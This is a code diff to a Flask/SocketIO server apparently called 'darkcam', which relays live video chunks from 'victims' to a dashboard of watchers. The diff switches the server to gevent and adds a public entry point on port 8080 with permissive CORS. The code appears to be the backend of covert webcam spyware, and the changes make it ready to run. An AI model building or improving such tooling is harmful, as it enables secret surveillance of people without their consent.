@@ -1,12 +1,15 @@
 import os
 import json
 import datetime
+from gevent import monkey
+monkey.patch_all()
+
 from flask import Flask, request, jsonify, render_template
 from flask_socketio import SocketIO, emit, join_room
 
 app = Flask(__name__)
 app.config["SECRET_KEY"] = "darkcam-secret"
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent",
                     logger=False, engineio_logger=False)
 
 OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "output")
@@ -105,3 +108,6 @@ def on_victim_join(data):
 def on_live_chunk(data):
     """Relay video chunk from victim to dashboard watchers."""
     socketio.emit("stream_chunk", data, room="dashboard")
+
+if __name__ == "__main__":
+    socketio.run(app, host="0.0.0.0", port=8080, allow_unsafe_werkzeug=True)
